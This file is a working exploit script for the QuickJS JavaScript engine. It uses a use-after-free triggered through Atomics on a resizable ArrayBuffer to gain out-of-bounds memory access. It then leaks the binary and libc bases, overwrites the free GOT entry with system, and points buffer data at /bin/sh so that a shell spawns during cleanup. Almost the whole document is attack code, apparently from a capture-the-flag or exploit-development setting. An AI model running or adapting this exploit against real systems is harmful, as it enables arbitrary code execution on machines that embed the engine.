// QuickJS Atomics UAF Exploit - Spawns a shell
// Overwrites free@GOT with system, sets JSArrayBuffer.data to /bin/sh

const JS_ARRAY_BUFFER_FREE_OFFSET = 0x14bc0n;
const GOT_FREE_OFFSET = 0x10b008n;
const LIBC_FREE_OFFSET = 0xa3240n;
const LIBC_SYSTEM_OFFSET = 0x53110n;
const LIBC_BINSH_OFFSET = 0x1a7ea4n;

// Stage 1: Trigger UAF via Atomics + Resizable ArrayBuffer
let triggerAB = new ArrayBuffer(48, { maxByteLength: 0x2000 });
let triggerView = new BigUint64Array(triggerAB);
let sprayBuffers = [];
let count = 0;

let malicious = {
    valueOf: function() {
        count++;
        if (count > 1) return 0x7ffffff0n - 8n;
        triggerAB.resize(0x2000);
        for (let i = 0; i < 100; i++) {
            sprayBuffers.push(new ArrayBuffer(8));
        }
        return 0x7ffffff0n - 8n;
    }
};

Atomics.add(triggerView, 0, malicious);

// Find corrupted buffer (OOB primitive)
let corruptedIdx = -1;
for (let i = 0; i < sprayBuffers.length; i++) {
    if (sprayBuffers[i].byteLength > 8) {
        corruptedIdx = i;
        break;
    }
}
let oobView = new BigUint64Array(sprayBuffers[corruptedIdx]);

// Stage 2: Leak binary base from free_func pointer
let binary_base = 0n;
let jsabInfos = [];
for (let i = 0; i < 3000; i++) {
    if (oobView[i] == 0xffffffff00000008n) {
        let free_func = oobView[i + 6];
        let highByte = free_func >> 40n;
        if (free_func != 0n && (highByte == 0x55n || highByte == 0x56n)) {
            if (binary_base == 0n) {
                binary_base = free_func - JS_ARRAY_BUFFER_FREE_OFFSET;
            }
        }
        jsabInfos.push({ idx: i, dataIdx: i + 2 });
    }
}

// Stage 3: Leak libc via GOT read
let got_free = binary_base + GOT_FREE_OFFSET;
let savedIdx = jsabInfos[1].idx;
let savedDataIdx = jsabInfos[1].dataIdx;
let savedByteLen = oobView[savedIdx];
let savedDataPtr = oobView[savedDataIdx];

oobView[savedIdx] = 0xffffffff00001000n;
oobView[savedDataIdx] = got_free;

let arbBufIdx = -1;
for (let i = 0; i < sprayBuffers.length; i++) {
    if (i == corruptedIdx) continue;
    if (sprayBuffers[i].byteLength == 0x1000) {
        arbBufIdx = i;
        break;
    }
}

let arbView = new BigUint64Array(sprayBuffers[arbBufIdx]);
let libc_free = arbView[0];
let libc_base = libc_free - LIBC_FREE_OFFSET;
let system_addr = libc_base + LIBC_SYSTEM_OFFSET;
let binsh_addr = libc_base + LIBC_BINSH_OFFSET;

// Stage 4: Overwrite free@GOT with system
arbView[0] = system_addr;

// Stage 5: Set up multiple JSArrayBuffers with data = /bin/sh
// When any of these are freed, system("/bin/sh") is called
for (let idx = 3; idx < jsabInfos.length && idx < 50; idx++) {
    let targetJsab = jsabInfos[idx];
    oobView[targetJsab.dataIdx] = binsh_addr;
}

// Stage 6: Restore the arb buffer's original data ptr to prevent crash
// But first, keep GOT overwritten
oobView[savedIdx] = savedByteLen;
// Don't restore savedDataPtr - we want GOT to stay modified
// Actually we need to fix this - the arb buffer's data still points to GOT
// When it gets freed, free(GOT) will crash
// Let's set it to /bin/sh too!
oobView[savedDataIdx] = binsh_addr;

// Stage 7: Exit - during cleanup, buffers are freed, triggering system("/bin/sh")
